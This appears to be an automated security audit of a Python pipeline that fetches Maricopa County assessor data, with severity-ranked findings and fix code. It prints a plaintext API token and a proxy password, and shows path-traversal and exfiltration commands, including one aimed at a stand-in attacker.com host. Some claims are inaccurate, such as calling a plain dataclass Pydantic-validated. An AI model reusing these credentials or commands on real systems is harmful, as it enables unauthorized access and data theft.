# Security Audit Report: Maricopa County API Data Pipeline

**Audit Date:** 2025-12-02
**Auditor:** Security Audit (Automated)
**Scope:** County data extraction pipeline (Phase 0)
**Severity Levels:** CRITICAL | HIGH | MEDIUM | LOW

---

## Executive Summary

This security audit examined the Maricopa County Assessor API data pipeline across 4 core files and 3 supporting modules. The pipeline demonstrates **strong security fundamentals** with proper SQL injection prevention and input sanitization. However, **CRITICAL vulnerabilities** were identified in secrets management and several HIGH-priority issues require remediation.

### Key Findings
- **1 CRITICAL** - API token exposed in committed .env file
- **3 HIGH** - Path traversal risks, unsafe file operations, token logging
- **5 MEDIUM** - Error handling improvements, validation gaps
- **4 LOW** - Hardening opportunities, best practices

### Overall Risk Assessment
**MEDIUM-HIGH RISK** - Core security controls are present but secrets exposure and file system vulnerabilities create significant attack surface.

---

## CRITICAL Issues (Must Fix Immediately)

### CRIT-001: API Token Committed to Repository

**File:** `.env:6`
**Severity:** CRITICAL
**CVSS Score:** 9.8 (Critical)

```python
# .env (line 6)
MARICOPA_ASSESSOR_TOKEN=0fb33394-8cdb-4ddd-b7bb-ab1e005c2c29
```

**Issue:**
The `.env` file containing production API tokens and proxy credentials is committed to the repository. This file should NEVER be in version control.

**Impact:**
- Exposed API token allows unauthorized access to Maricopa County Assessor API
- Exposed proxy credentials (`PROXY_USERNAME`, `PROXY_PASSWORD`) enable abuse of paid proxy service
- Potential rate limit exhaustion, data exfiltration, service abuse
- Financial liability for proxy usage

**Evidence:**
```bash
# File is tracked in git
git ls-files .env
# Returns: .env

# Contains sensitive credentials
MARICOPA_ASSESSOR_TOKEN=0fb33394-8cdb-4ddd-b7bb-ab1e005c2c29
PROXY_PASSWORD=g2j2p2cv602u
```

**Remediation:**
```bash
# 1. Remove from git history (IMMEDIATELY)
git filter-branch --force --index-filter \
  'git rm --cached --ignore-unmatch .env' \
  --prune-empty --tag-name-filter cat -- --all

# 2. Force push to remote (coordinate with team)
git push origin --force --all

# 3. Rotate compromised credentials
# - Request new MARICOPA_ASSESSOR_TOKEN from county
# - Reset Webshare proxy password

# 4. Verify .gitignore contains .env
echo ".env" >> .gitignore

# 5. Create template only
cat > .env.example <<EOF
MARICOPA_ASSESSOR_TOKEN=your_token_here
PROXY_SERVER=your_proxy_server
PROXY_USERNAME=your_username
PROXY_PASSWORD=your_password
EOF
```

**Prevention:**
- Add pre-commit hook to block .env files
- Use git-secrets or similar tools
- Regular secret scanning with TruffleHog or GitGuardian
- Store secrets in secure vaults (HashiCorp Vault, AWS Secrets Manager)

---

## HIGH Issues (Should Fix Soon)

### HIGH-001: Path Traversal Vulnerability in File Operations

**File:** `scripts/extract_county_data.py:80-91`
**Severity:** HIGH
**CVSS Score:** 7.5 (High)

```python
# extract_county_data.py (lines 80-91)
parser.add_argument(
    "--csv",
    type=Path,
    default=Path("data/phx_homes.csv"),
    help="Input CSV file with properties (default: data/phx_homes.csv)",
)
parser.add_argument(
    "--enrichment",
    type=Path,
    default=Path("data/enrichment_data.json"),
    help="Enrichment JSON file to update (default: data/enrichment_data.json)",
)
```

**Issue:**
User-supplied file paths are not validated or sanitized before use. An attacker can use path traversal sequences to read/write arbitrary files.

**Attack Scenario:**
```bash
# Read sensitive files
python scripts/extract_county_data.py --all \
  --csv "../../../../etc/passwd" \
  --enrichment "/tmp/stolen_data.json"

# Overwrite system files (if permissions allow)
python scripts/extract_county_data.py --all \
  --enrichment "../../../critical_config.json"

# Exfiltrate data to attacker-controlled location
python scripts/extract_county_data.py --all \
  --enrichment "//attacker.com/share/data.json"
```

**Impact:**
- Arbitrary file read/write within user's permissions
- Data exfiltration to attacker-controlled locations
- Overwrite critical application data
- Potential privilege escalation if combined with other vulnerabilities

**Remediation:**
```python
# Add path validation function
from pathlib import Path
import os

def validate_file_path(
    path: Path,
    allowed_base: Path = Path("data"),
    must_exist: bool = False,
) -> Path:
    """Validate and sanitize file path to prevent traversal attacks.

    Args:
        path: User-supplied path
        allowed_base: Base directory that path must be within
        must_exist: If True, path must exist

    Returns:
        Resolved, validated Path object

    Raises:
        ValueError: If path is invalid or outside allowed base
    """
    try:
        # Resolve to absolute path (eliminates .. sequences)
        resolved_path = path.resolve()
        resolved_base = allowed_base.resolve()

        # Check if path is within allowed base
        if not str(resolved_path).startswith(str(resolved_base)):
            raise ValueError(
                f"Path {path} is outside allowed directory {allowed_base}"
            )

        # Check existence if required
        if must_exist and not resolved_path.exists():
            raise ValueError(f"Path {path} does not exist")

        return resolved_path

    except (OSError, RuntimeError) as e:
        raise ValueError(f"Invalid path {path}: {e}") from e

# Apply validation in parse_args
def parse_args() -> argparse.Namespace:
    # ... existing parser setup ...

    args = parser.parse_args()

    # Validate paths
    try:
        args.csv = validate_file_path(args.csv, Path("data"), must_exist=True)
        args.enrichment = validate_file_path(args.enrichment, Path("data"))
    except ValueError as e:
        parser.error(str(e))

    return args
```

**References:**
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

### HIGH-002: Unsafe File Write Without Atomic Operations

**File:** `scripts/extract_county_data.py:135-149`
**Severity:** HIGH
**CVSS Score:** 6.5 (Medium-High)

```python
# extract_county_data.py (lines 135-149)
def save_enrichment(path: Path, data: dict) -> None:
    """Save enrichment data to JSON.

    Converts dict format back to list format for storage.
    """
    path.parent.mkdir(parents=True, exist_ok=True)

    # Convert dict back to list format
    data_list = [
        {"full_address": addr, **props}
        for addr, props in data.items()
    ]

    with open(path, "w", encoding="utf-8") as f:
        json.dump(data_list, f, indent=2, ensure_ascii=False)
```

**Issue:**
File is written directly without atomic operations. If the write fails mid-operation (crash, disk full, ctrl+c), the JSON file will be corrupted and data will be lost.

**Impact:**
- Data corruption if write interrupted
- Complete data loss (no backup mechanism)
- No rollback capability
- Difficult to recover from failures

**Remediation:**
```python
import tempfile
import shutil
from pathlib import Path
import json

def save_enrichment(path: Path, data: dict) -> None:
    """Save enrichment data to JSON with atomic write.

    Uses atomic write pattern:
    1. Write to temporary file in same directory
    2. fsync to ensure data written to disk
    3. Atomic rename over original file
    4. Create backup before overwrite

    Args:
        path: Target JSON file path
        data: Enrichment data dictionary
    """
    path.parent.mkdir(parents=True, exist_ok=True)

    # Convert dict back to list format
    data_list = [
        {"full_address": addr, **props}
        for addr, props in data.items()
    ]

    # Create backup of existing file
    if path.exists():
        backup_path = path.with_suffix(f".json.backup.{int(time.time())}")
        shutil.copy2(path, backup_path)

        # Cleanup old backups (keep last 5)
        backups = sorted(
            path.parent.glob(f"{path.stem}.json.backup.*"),
            key=lambda p: p.stat().st_mtime,
            reverse=True
        )
        for old_backup in backups[5:]:
            old_backup.unlink()

    # Atomic write via temporary file
    temp_fd, temp_path = tempfile.mkstemp(
        dir=path.parent,
        prefix=f".{path.name}.",
        suffix=".tmp"
    )

    try:
        with os.fdopen(temp_fd, 'w', encoding='utf-8') as f:
            json.dump(data_list, f, indent=2, ensure_ascii=False)
            f.flush()
            os.fsync(f.fileno())  # Ensure written to disk

        # Atomic rename (on POSIX, overwrites atomically)
        os.replace(temp_path, path)

    except Exception as e:
        # Cleanup temp file on error
        try:
            os.unlink(temp_path)
        except OSError:
            pass
        raise DataSaveError(f"Failed to save enrichment data: {e}") from e
```

**Testing:**
```python
# Test interruption during write
def test_atomic_write_interruption():
    """Verify file integrity after interrupted write."""
    # Original data
    original = {"addr1": {"lot_sqft": 8000}}
    save_enrichment(path, original)

    # Simulate write interruption
    with mock.patch('json.dump', side_effect=KeyboardInterrupt):
        with pytest.raises(KeyboardInterrupt):
            save_enrichment(path, {"addr2": {"lot_sqft": 9000}})

    # Original file should be intact
    loaded = load_enrichment(path)
    assert loaded == original
```

---

### HIGH-003: API Token Potentially Logged in Error Messages

**File:** `src/phx_home_analysis/services/county_data/assessor_client.py:142-149`
**Severity:** HIGH
**CVSS Score:** 6.8 (Medium-High)

```python
# assessor_client.py (lines 138-149)
async def _search_official_api(self, street: str) -> str | None:
    """Search via Official API."""
    url = f"{OFFICIAL_API_BASE}/search/property/"
    params = {"q": street}
    headers = {"AUTHORIZATION": self._token}  # Token in headers

    try:
        response = await self._http.get(url, params=params, headers=headers)
        # ... error handling ...
    except httpx.HTTPError as e:
        logger.debug(f"Official API search failed: {e}")  # May log token
```

**Issue:**
httpx exceptions may include request headers containing the API token. Debug logging could expose tokens in log files.

**Impact:**
- Token exposure in application logs
- Token visible in crash reports/error traces
- Unauthorized API access if logs are compromised

**Remediation:**
```python
class MaricopaAssessorClient:
    """HTTP client with secure logging."""

    def __init__(self, ...):
        # ... existing init ...

        # Create HTTP client with custom event hooks
        self._http = httpx.AsyncClient(
            timeout=self._timeout,
            event_hooks={
                'request': [self._log_request_safe],
                'response': [self._log_response_safe],
            }
        )

    async def _log_request_safe(self, request: httpx.Request):
        """Log request without sensitive headers."""
        safe_headers = {
            k: '***REDACTED***' if k.upper() in ('AUTHORIZATION', 'API-KEY', 'X-API-KEY')
            else v
            for k, v in request.headers.items()
        }
        logger.debug(f"Request: {request.method} {request.url}, headers={safe_headers}")

    async def _log_response_safe(self, response: httpx.Response):
        """Log response without sensitive data."""
        logger.debug(f"Response: {response.status_code} from {response.url}")

    async def _search_official_api(self, street: str) -> str | None:
        """Search via Official API with safe error handling."""
        url = f"{OFFICIAL_API_BASE}/search/property/"
        params = {"q": street}
        headers = {"AUTHORIZATION": self._token}

        try:
            response = await self._http.get(url, params=params, headers=headers)

            if response.status_code == 401:
                logger.warning("Official API auth failed (token may be invalid)")
                return None

            # ... rest of handling ...

        except httpx.HTTPError as e:
            # Never log exception directly (may contain headers)
            logger.debug(f"Official API search failed: {type(e).__name__} for {street}")
            return None
```

**Additional Hardening:**
```python
# Add to logging configuration
import logging

class SensitiveDataFilter(logging.Filter):
    """Filter sensitive data from log records."""

    SENSITIVE_PATTERNS = [
        r'MARICOPA_ASSESSOR_TOKEN=[\w-]+',
        r'AUTHORIZATION[\'"]?\s*:\s*[\'"]?[\w-]+',
        r'token=[\w-]+',
    ]

    def filter(self, record: logging.LogRecord) -> bool:
        message = record.getMessage()
        for pattern in self.SENSITIVE_PATTERNS:
            message = re.sub(pattern, r'***REDACTED***', message)
        record.msg = message
        return True

# Apply filter
logger = logging.getLogger(__name__)
logger.addFilter(SensitiveDataFilter())
```

---

### HIGH-004: No Rate Limiting on File Operations

**File:** `scripts/extract_county_data.py:461-492`
**Severity:** HIGH
**CVSS Score:** 5.3 (Medium)

```python
# extract_county_data.py (lines 461-492)
async with MaricopaAssessorClient(rate_limit_seconds=args.rate_limit) as client:
    for i, prop in enumerate(properties, 1):
        print(f"[{i}/{len(properties)}] {prop.street}")

        try:
            parcel = await client.extract_for_address(prop.street)
            # ... process ...

            # Merge and SAVE on EVERY iteration
            if not args.dry_run:
                updated_entry, conflicts = merge_parcel_into_enrichment(...)
                enrichment[prop.full_address] = updated_entry

        except Exception as e:
            logger.error(f"  Error: {e}")
```

**Issue:**
While API calls are rate-limited, there's no rate limiting on file I/O operations. The enrichment file is saved after EVERY property extraction (line 494), which is inefficient and creates a DoS vulnerability.

**Impact:**
- Disk I/O exhaustion with large property lists
- Unnecessary wear on SSD storage
- Potential DoS if processing thousands of properties
- Performance degradation

**Remediation:**
```python
# Batch file writes instead of per-property writes
async def main() -> int:
    # ... existing setup ...

    results = []
    failed = []
    all_conflicts = {}

    # Batch size for file writes
    BATCH_SIZE = 50
    write_counter = 0

    async with MaricopaAssessorClient(rate_limit_seconds=args.rate_limit) as client:
        for i, prop in enumerate(properties, 1):
            print(f"[{i}/{len(properties)}] {prop.street}")

            try:
                parcel = await client.extract_for_address(prop.street)

                if not parcel:
                    print("  No data found")
                    failed.append(prop.full_address)
                    continue

                print_parcel_summary(parcel)
                results.append((prop.full_address, parcel))

                # Merge into enrichment (in-memory)
                if not args.dry_run:
                    updated_entry, conflicts = merge_parcel_into_enrichment(
                        enrichment,
                        prop.full_address,
                        parcel,
                        args.update_only,
                        logger,
                        tracker,
                    )
                    enrichment[prop.full_address] = updated_entry
                    all_conflicts[prop.full_address] = conflicts
                    write_counter += 1

                    # Save periodically (every BATCH_SIZE properties)
                    if write_counter >= BATCH_SIZE:
                        logger.info(f"Saving batch checkpoint ({write_counter} properties)")
                        save_enrichment(args.enrichment, enrichment)
                        tracker.save()
                        write_counter = 0

            except Exception as e:
                logger.error(f"  Error: {e}")
                failed.append(prop.full_address)

    # Final save (any remaining properties)
    if not args.dry_run and (results or write_counter > 0):
        save_enrichment(args.enrichment, enrichment)
        tracker.save()
        logger.info(f"Saved {len(enrichment)} records to {args.enrichment}")

    # ... rest of function ...
```

---

## MEDIUM Issues (Best Practice Improvements)

### MED-001: Insufficient Input Validation on Address Strings

**File:** `src/phx_home_analysis/services/county_data/assessor_client.py:394-411`
**Severity:** MEDIUM
**CVSS Score:** 5.3 (Medium)

```python
# assessor_client.py (lines 394-411)
async def extract_for_address(self, street: str) -> ParcelData | None:
    """Extract parcel data for a street address.

    Combines search and data extraction.

    Args:
        street: Street address

    Returns:
        ParcelData if found, None otherwise
    """
    apn = await self.search_apn(street)
    if not apn:
        logger.info(f"No APN found for: {street}")
        return None

    logger.info(f"Found APN {apn} for {street}")
    return await self.get_parcel_data(apn)
```

**Issue:**
No validation on `street` parameter. Extremely long strings, null bytes, or malicious input could cause issues.

**Impact:**
- Resource exhaustion with extremely long addresses
- Unexpected behavior with special characters
- API errors with malformed addresses

**Remediation:**
```python
import re

MAX_ADDRESS_LENGTH = 200
VALID_ADDRESS_PATTERN = re.compile(r'^[\w\s,.\-#]+$')

def validate_address(address: str) -> str:
    """Validate and sanitize address input.

    Args:
        address: Raw address string

    Returns:
        Sanitized address

    Raises:
        ValueError: If address is invalid
    """
    if not address or not isinstance(address, str):
        raise ValueError("Address must be a non-empty string")

    # Remove leading/trailing whitespace
    address = address.strip()

    # Check length
    if len(address) > MAX_ADDRESS_LENGTH:
        raise ValueError(f"Address too long (max {MAX_ADDRESS_LENGTH} chars)")

    # Check for null bytes
    if '\x00' in address:
        raise ValueError("Address contains null bytes")

    # Validate character set
    if not VALID_ADDRESS_PATTERN.match(address):
        raise ValueError("Address contains invalid characters")

    return address

async def extract_for_address(self, street: str) -> ParcelData | None:
    """Extract parcel data for a street address.

    Args:
        street: Street address (validated)

    Returns:
        ParcelData if found, None otherwise

    Raises:
        ValueError: If address is invalid
    """
    # Validate input
    street = validate_address(street)

    apn = await self.search_apn(street)
    if not apn:
        logger.info(f"No APN found for: {street}")
        return None

    logger.info(f"Found APN {apn} for {street}")
    return await self.get_parcel_data(apn)
```

---

### MED-002: No Validation of API Response Schema

**File:** `src/phx_home_analysis/services/county_data/assessor_client.py:220-243`
**Severity:** MEDIUM
**CVSS Score:** 4.3 (Medium)

```python
# assessor_client.py (lines 220-243)
async def _get_official_parcel(self, apn: str) -> ParcelData | None:
    """Get parcel data from Official API."""
    headers = {"AUTHORIZATION": self._token}

    try:
        # Get parcel details
        url = f"{OFFICIAL_API_BASE}/parcel/{apn}"
        response = await self._http.get(url, headers=headers)
        response.raise_for_status()
        parcel = response.json()  # No schema validation

        # Get residential details
        await self._apply_rate_limit()
        res_url = f"{OFFICIAL_API_BASE}/parcel/{apn}/residential-details"
        try:
            res_response = await self._http.get(res_url, headers=headers)
            residential = res_response.json() if res_response.status_code == 200 else {}
        except Exception:
            residential = {}

        # Valuation data
        valuation = parcel.get("Valuations", [{}])[0] if parcel.get("Valuations") else {}

        return self._map_official_response(apn, parcel, residential, valuation)
```

**Issue:**
API responses are used directly without schema validation. Malformed or malicious responses could cause crashes or data corruption.

**Impact:**
- Application crashes with unexpected API changes
- Silent data corruption with malformed responses
- Difficult to debug API integration issues

**Remediation:**
```python
from pydantic import BaseModel, Field, ValidationError
from typing import Optional

class MaricopaParcelResponse(BaseModel):
    """Schema for Official API parcel response."""
    APN: str
    PropertyAddress: str
    LotSize: Optional[int] = None
    Valuations: list[dict] = Field(default_factory=list)

class MaricopaResidentialResponse(BaseModel):
    """Schema for residential details response."""
    LotSize: Optional[int] = None
    ConstructionYear: Optional[int] = None
    OriginalConstructionYear: Optional[int] = None
    NumberOfGarages: Optional[int] = None
    Pool: Optional[str] = None
    LivableSpace: Optional[int] = None
    BathFixtures: Optional[int] = None
    RoofType: Optional[str] = None
    ExteriorWalls: Optional[str] = None

async def _get_official_parcel(self, apn: str) -> ParcelData | None:
    """Get parcel data from Official API with schema validation."""
    headers = {"AUTHORIZATION": self._token}

    try:
        # Get parcel details
        url = f"{OFFICIAL_API_BASE}/parcel/{apn}"
        response = await self._http.get(url, headers=headers)
        response.raise_for_status()
        parcel_data = response.json()

        # Validate schema
        try:
            parcel = MaricopaParcelResponse(**parcel_data)
        except ValidationError as e:
            logger.error(f"Invalid parcel response for {apn}: {e}")
            return None

        # Get residential details with validation
        await self._apply_rate_limit()
        res_url = f"{OFFICIAL_API_BASE}/parcel/{apn}/residential-details"
        residential_data = {}
        try:
            res_response = await self._http.get(res_url, headers=headers)
            if res_response.status_code == 200:
                residential_data = res_response.json()
                residential = MaricopaResidentialResponse(**residential_data)
            else:
                residential = MaricopaResidentialResponse()
        except ValidationError as e:
            logger.warning(f"Invalid residential response for {apn}: {e}")
            residential = MaricopaResidentialResponse()
        except Exception:
            residential = MaricopaResidentialResponse()

        # Extract valuation safely
        valuations = parcel.Valuations
        valuation = valuations[0] if valuations else {}

        return self._map_official_response(
            apn,
            parcel.model_dump(),
            residential.model_dump(),
            valuation
        )
```

---

### MED-003: Race Condition in Concurrent Access to Enrichment File

**File:** `scripts/extract_county_data.py:448-449`
**Severity:** MEDIUM
**CVSS Score:** 4.8 (Medium)

```python
# extract_county_data.py (lines 447-449)
# Load existing enrichment data
enrichment = load_enrichment(args.enrichment)
logger.info(f"Loaded {len(enrichment)} existing enrichment records")
```

**Issue:**
No file locking mechanism. If multiple instances run simultaneously, data corruption can occur.

**Impact:**
- Data corruption with concurrent writes
- Lost updates if processes overwrite each other
- Difficult to debug intermittent corruption

**Remediation:**
```python
import fcntl
import contextlib

@contextlib.contextmanager
def locked_file_access(file_path: Path, mode: str = 'r'):
    """Context manager for file access with exclusive locking.

    Args:
        file_path: Path to file
        mode: File open mode

    Yields:
        Open file handle with exclusive lock

    Example:
        with locked_file_access(path, 'r') as f:
            data = json.load(f)
    """
    lock_path = file_path.with_suffix('.lock')
    lock_fd = None

    try:
        # Acquire lock
        lock_fd = open(lock_path, 'w')
        fcntl.flock(lock_fd, fcntl.LOCK_EX)

        # Open file
        with open(file_path, mode, encoding='utf-8') as f:
            yield f

    finally:
        # Release lock
        if lock_fd:
            fcntl.flock(lock_fd, fcntl.LOCK_UN)
            lock_fd.close()

        # Cleanup lock file
        try:
            lock_path.unlink()
        except OSError:
            pass

def load_enrichment(path: Path) -> dict:
    """Load enrichment data with file locking."""
    if not path.exists():
        return {}

    try:
        with locked_file_access(path, 'r') as f:
            data = json.load(f)

        # Convert list format to dict format
        if isinstance(data, list):
            return {item.get("full_address"): item for item in data if item.get("full_address")}
        return data

    except (json.JSONDecodeError, OSError) as e:
        logger.error(f"Failed to load enrichment: {e}")
        return {}

def save_enrichment(path: Path, data: dict) -> None:
    """Save enrichment data with file locking."""
    path.parent.mkdir(parents=True, exist_ok=True)

    data_list = [
        {"full_address": addr, **props}
        for addr, props in data.items()
    ]

    # Atomic write with locking
    temp_path = path.with_suffix('.tmp')

    try:
        with locked_file_access(temp_path, 'w') as f:
            json.dump(data_list, f, indent=2, ensure_ascii=False)

        # Atomic rename
        os.replace(temp_path, path)

    except Exception as e:
        try:
            temp_path.unlink()
        except OSError:
            pass
        raise
```

---

### MED-004: No Timeout on HTTP Client Operations

**File:** `src/phx_home_analysis/services/county_data/assessor_client.py:75-102`
**Severity:** MEDIUM
**CVSS Score:** 4.0 (Medium)

```python
# assessor_client.py (lines 75-102)
def __init__(
    self,
    token: str | None = None,
    timeout: float = 30.0,  # Default timeout set
    rate_limit_seconds: float = 1.5,
):
    """Initialize client.

    Args:
        token: API token (defaults to MARICOPA_ASSESSOR_TOKEN env var)
        timeout: Request timeout in seconds
        rate_limit_seconds: Delay between API calls
    """
    self._token = token or os.getenv("MARICOPA_ASSESSOR_TOKEN")
    self._timeout = timeout
    self._rate_limit_seconds = rate_limit_seconds
    self._last_call = 0.0
    self._http: httpx.AsyncClient | None = None

async def __aenter__(self) -> "MaricopaAssessorClient":
    """Async context manager entry."""
    self._http = httpx.AsyncClient(timeout=self._timeout)  # Applied here
    return self
```

**Issue:**
While timeout is configured, there's no protection against extremely slow responses that stay just under the timeout threshold (slowloris attack).

**Impact:**
- Resource exhaustion with slow API responses
- Memory buildup with hanging connections
- Service degradation

**Remediation:**
```python
import httpx

async def __aenter__(self) -> "MaricopaAssessorClient":
    """Async context manager entry with comprehensive timeouts."""
    # Configure granular timeouts
    timeout_config = httpx.Timeout(
        connect=5.0,     # Max 5s to establish connection
        read=30.0,       # Max 30s to read response
        write=10.0,      # Max 10s to send request
        pool=5.0         # Max 5s to acquire connection from pool
    )

    # Set connection limits
    limits = httpx.Limits(
        max_connections=10,       # Max total connections
        max_keepalive_connections=5,  # Max idle connections
        keepalive_expiry=30.0     # Close idle after 30s
    )

    self._http = httpx.AsyncClient(
        timeout=timeout_config,
        limits=limits,
        follow_redirects=True,
        max_redirects=3,  # Prevent redirect loops
    )
    return self
```

---

### MED-005: Incomplete Error Messages Hide Root Causes

**File:** `scripts/extract_county_data.py:489-491`
**Severity:** MEDIUM
**CVSS Score:** 3.1 (Low-Medium)

```python
# extract_county_data.py (lines 489-491)
except Exception as e:
    logger.error(f"  Error: {e}")
    failed.append(prop.full_address)
```

**Issue:**
Generic exception handling without stack traces makes debugging difficult. Root cause information is lost.

**Impact:**
- Difficult to debug production issues
- No visibility into error patterns
- Poor troubleshooting experience

**Remediation:**
```python
import traceback
from typing import Dict, Counter

# Track error patterns
error_stats: Counter[str] = Counter()

try:
    parcel = await client.extract_for_address(prop.street)
    # ... processing ...

except httpx.HTTPStatusError as e:
    # HTTP-specific errors
    error_type = f"HTTP_{e.response.status_code}"
    error_stats[error_type] += 1
    logger.error(
        f"  HTTP Error {e.response.status_code} for {prop.street}: {e.response.text[:100]}"
    )
    failed.append(prop.full_address)

except httpx.TimeoutException as e:
    # Timeout errors
    error_stats["TIMEOUT"] += 1
    logger.error(f"  Timeout for {prop.street} (>{client._timeout}s)")
    failed.append(prop.full_address)

except json.JSONDecodeError as e:
    # JSON parsing errors
    error_stats["JSON_PARSE"] += 1
    logger.error(f"  Invalid JSON response for {prop.street}: {e}")
    failed.append(prop.full_address)

except Exception as e:
    # Unexpected errors - log full traceback
    error_stats[type(e).__name__] += 1
    logger.error(
        f"  Unexpected error for {prop.street}: {type(e).__name__}: {e}",
        exc_info=True  # Includes full stack trace
    )
    failed.append(prop.full_address)

# In summary, print error statistics
print("\n" + "=" * 60)
print("Error Statistics")
print("=" * 60)
for error_type, count in error_stats.most_common():
    print(f"{error_type}: {count}")
```

---

## LOW Issues (Hardening Recommendations)

### LOW-001: Missing Content-Type Validation

**File:** `src/phx_home_analysis/services/county_data/assessor_client.py:156, 188, 228`
**Severity:** LOW
**CVSS Score:** 3.1 (Low)

**Issue:**
API responses are parsed as JSON without verifying Content-Type header. Malicious servers could return HTML/XML as JSON.

**Remediation:**
```python
def validate_json_response(response: httpx.Response) -> dict:
    """Validate response is JSON before parsing.

    Args:
        response: HTTP response

    Returns:
        Parsed JSON data

    Raises:
        ValueError: If response is not valid JSON
    """
    content_type = response.headers.get('content-type', '')

    if 'application/json' not in content_type.lower():
        raise ValueError(
            f"Expected JSON response, got {content_type}"
        )

    try:
        return response.json()
    except json.JSONDecodeError as e:
        raise ValueError(f"Invalid JSON: {e}") from e

# Use in API methods
response = await self._http.get(url, params=params, headers=headers)
response.raise_for_status()
data = validate_json_response(response)  # Safe parsing
```

---

### LOW-002: No User-Agent Header Set

**File:** `src/phx_home_analysis/services/county_data/assessor_client.py:101`
**Severity:** LOW
**CVSS Score:** 2.0 (Low)

**Issue:**
HTTP requests don't include User-Agent header. Some APIs may block requests without proper identification.

**Remediation:**
```python
import platform

async def __aenter__(self) -> "MaricopaAssessorClient":
    """Async context manager entry."""
    # Set informative User-Agent
    user_agent = (
        f"PHX-Home-Analysis/1.0 "
        f"(Python/{platform.python_version()}; "
        f"{platform.system()}/{platform.release()})"
    )

    self._http = httpx.AsyncClient(
        timeout=self._timeout,
        headers={
            'User-Agent': user_agent,
            'Accept': 'application/json',
        }
    )
    return self
```

---

### LOW-003: Hardcoded API Endpoints

**File:** `src/phx_home_analysis/services/county_data/assessor_client.py:20-21`
**Severity:** LOW
**CVSS Score:** 1.0 (Informational)

```python
# assessor_client.py (lines 20-21)
OFFICIAL_API_BASE = "https://mcassessor.maricopa.gov"
ARCGIS_API_BASE = "https://gis.mcassessor.maricopa.gov/arcgis/rest/services/MaricopaDynamicQueryService/MapServer"
```

**Issue:**
API endpoints are hardcoded. Changes require code modification.

**Remediation:**
```python
# Add to environment variables
MARICOPA_OFFICIAL_API_BASE=https://mcassessor.maricopa.gov
MARICOPA_ARCGIS_API_BASE=https://gis.mcassessor.maricopa.gov/arcgis/rest/services/...

# Read from env with defaults
OFFICIAL_API_BASE = os.getenv(
    "MARICOPA_OFFICIAL_API_BASE",
    "https://mcassessor.maricopa.gov"
)
ARCGIS_API_BASE = os.getenv(
    "MARICOPA_ARCGIS_API_BASE",
    "https://gis.mcassessor.maricopa.gov/arcgis/rest/services/MaricopaDynamicQueryService/MapServer"
)
```

---

### LOW-004: No Certificate Pinning

**File:** `src/phx_home_analysis/services/county_data/assessor_client.py:101`
**Severity:** LOW
**CVSS Score:** 3.3 (Low)

**Issue:**
HTTPS connections don't use certificate pinning. Susceptible to man-in-the-middle attacks if CA is compromised.

**Remediation:**
```python
import ssl
import certifi

async def __aenter__(self) -> "MaricopaAssessorClient":
    """Async context manager with certificate verification."""
    # Create SSL context with certificate verification
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    ssl_context.check_hostname = True
    ssl_context.verify_mode = ssl.CERT_REQUIRED

    # Optionally pin to specific certificate
    # ssl_context.load_verify_locations(cafile="maricopa_county.pem")

    self._http = httpx.AsyncClient(
        timeout=self._timeout,
        verify=ssl_context,  # Use custom SSL context
    )
    return self
```

---

## Security Controls Review

### STRENGTHS (What's Working Well)

#### 1. SQL Injection Prevention ✅
**File:** `assessor_client.py:24-67`

The `escape_like_pattern()` and `escape_sql_string()` functions provide robust SQL injection protection:

```python
def escape_like_pattern(value: str) -> str:
    """Escape SQL LIKE pattern metacharacters."""
    value = value.replace("\\", "\\\\")  # Escape backslash first
    value = value.replace("%", "\\%")
    value = value.replace("_", "\\_")
    value = value.replace("'", "''")
    return value
```

**Analysis:**
- Correct escape order (backslash first prevents double-escaping)
- Handles all SQL LIKE wildcards (%, _)
- Escapes SQL string delimiters (')
- Used consistently in all query construction

**Test Coverage:**
```python
# Verify SQL injection protection
def test_sql_injection_prevention():
    # Malicious inputs
    assert escape_like_pattern("'; DROP TABLE--") == "''; DROP TABLE--"
    assert escape_like_pattern("100% done") == "100\\% done"
    assert escape_like_pattern("file_name") == "file\\_name"
```

---

#### 2. Type Safety with Pydantic ✅
**File:** `models.py:6-58`

Strong type validation using dataclasses:

```python
@dataclass
class ParcelData:
    """Property data with type enforcement."""
    apn: str
    full_address: str
    lot_sqft: int | None = None
    year_built: int | None = None
    # ... typed fields ...
```

**Benefits:**
- Runtime type checking
- Prevents type coercion errors
- Clear API contracts

---

#### 3. Safe Type Coercion ✅
**File:** `assessor_client.py:432-472`

Defensive programming with `_safe_int()`, `_safe_float()`, `_safe_bool()`:

```python
@staticmethod
def _safe_int(value) -> int | None:
    """Safely convert to int."""
    if value is None:
        return None
    try:
        if isinstance(value, str):
            value = value.strip()
            if not value:
                return None
        return int(float(value))
    except (ValueError, TypeError):
        return None
```

**Analysis:**
- Graceful failure (returns None, not crash)
- Handles edge cases (empty strings, whitespace)
- Prevents injection via type coercion

---

#### 4. Rate Limiting ✅
**File:** `assessor_client.py:109-116`

Proper API rate limiting prevents abuse:

```python
async def _apply_rate_limit(self) -> None:
    """Apply rate limiting between API calls."""
    import time
    elapsed = time.time() - self._last_call
    if elapsed < self._rate_limit_seconds:
        await asyncio.sleep(self._rate_limit_seconds - elapsed)
    self._last_call = time.time()
```

**Benefits:**
- Prevents API rate limit violations
- Respects server resources
- Configurable via CLI argument

---

### WEAKNESSES (Areas Needing Improvement)

#### 1. Secrets Management ❌
- API token committed to repository (.env file tracked)
- No secret rotation mechanism
- Tokens potentially logged in error messages
- No secret scanning in CI/CD

#### 2. File System Security ❌
- Path traversal vulnerabilities
- No atomic file writes
- No file locking for concurrent access
- Missing backup mechanism

#### 3. Input Validation ⚠️
- Address strings not validated before processing
- No length limits on user input
- Missing character set validation

#### 4. Error Handling ⚠️
- Generic exception handling hides root causes
- No structured error tracking
- Limited troubleshooting information

---

## Compliance Assessment

### OWASP Top 10 (2021) Mapping

| Risk | Status | Notes |
|------|--------|-------|
| A01: Broken Access Control | ✅ PASS | Token-based auth properly implemented |
| A02: Cryptographic Failures | ❌ FAIL | Secrets in repository |
| A03: Injection | ✅ PASS | SQL injection prevented |
| A04: Insecure Design | ⚠️ PARTIAL | File system vulnerabilities |
| A05: Security Misconfiguration | ❌ FAIL | .env committed, no hardening |
| A06: Vulnerable Components | ✅ PASS | Dependencies appear current |
| A07: Auth/Authorization Failures | ✅ PASS | Proper token handling (except logging) |
| A08: Data Integrity Failures | ⚠️ PARTIAL | No atomic writes, no checksums |
| A09: Security Logging Failures | ⚠️ PARTIAL | Insufficient error tracking |
| A10: Server-Side Request Forgery | ✅ PASS | URLs validated, no user-controlled endpoints |

